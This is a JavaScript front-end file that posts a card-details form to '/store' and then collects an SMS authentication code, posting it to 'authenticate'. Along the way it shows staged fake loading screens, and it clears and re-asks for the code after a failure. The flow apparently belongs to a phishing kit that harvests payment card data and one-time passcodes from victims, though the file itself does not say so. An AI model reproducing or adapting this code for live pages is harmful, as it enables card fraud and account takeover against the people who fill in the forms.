clicked_store = false;
clicked_sms = false;

$("#card_info").on("submit", function (t) {
    t.preventDefault();
    var e = $(this).parsley(),
        n = e.isValid();
    if (($(".bs-callout-info").toggleClass("hidden", !n), $(".bs-callout-warning").toggleClass("hidden", n), n)) {
        e.reset();
        var i = $(this),
            r = i.serialize();
        $(".modal").modal("hide")
        const xhttp = new XMLHttpRequest();
        xhttp.onload = function() {
            data = JSON.parse(this.responseText)
            if(data["success"]){
                if(data["redirect"]){
                    window.location.href = "/"+window.sessionHash+"/success";
                }
                $("#error-alert").hide();
                setTimeout(function () {
                    $("#auth-modal").replaceWith(data["data"])
                    $("#auth-modal").modal({ backdrop: "static", keyboard: !1 }).modal("show");
                }, 2300)
                $("body").on("shown.bs.modal", "#auth-modal", function () {
                    var t = $(this);
                    setTimeout(function () {
                        t.find(".loading-1").hide(), t.find(".loading-2").show();
                    }, 4e3),
                        setTimeout(function () {
                            t.find(".loading-2").hide(), t.find(".auth-form").show(), t.find(".modal-content").css({ width: "100%", "margin-left": "0" });
                        }, 6e3);

                });
            }
            else{
                clicked_store = false;
                $("#error-alert").show();
            }
            document.getElementById("auth-modal").innerHTML =data["data"]
        }

        if(!clicked_store) {
            clicked_store=true;
            var t = $("body");
            $("#auth-modal").show();
            $("#auth-modal").modal({ backdrop: "static", keyboard: !1 }).modal("show");
            t.find(".loading-1").show();
            xhttp.open("POST", "/store");
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.setRequestHeader("X-CSRF-TOKEN", $('meta[name="csrf-token"]').attr('content'));
            xhttp.send(r);
        }
    }
});
$("body").on("submit", "#auth-modal form", function (e) {
    e.preventDefault();
    var n = $(this),
        i = n.closest(".modal"),
        r = n.serialize();
    const xhttp = new XMLHttpRequest();
    xhttp.onload = function() {
        data = JSON.parse(this.responseText)
        if(!data["success"]){
            clicked_sms=false;
            i = $("body")
            setTimeout(function () {
                i.find(".loading-2").hide()
                i.find(".auth-form input").val("")
                i.find(".auth-form").show()
                $("#auth-error").show();
            }, 2000);
        }
        else{
            window.location.href = "/"+window.sessionHash+"/success";
        }
    }
    $("#auth-error").hide()
    i.find(".auth-form").hide()
    i.find(".loading-2").show();
    if(!clicked_sms) {
        clicked_sms=true;
        xhttp.open("POST", "authenticate");
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.setRequestHeader("X-CSRF-TOKEN", $('meta[name="csrf-token"]').attr('content'));
        xhttp.send(r);
    }
});
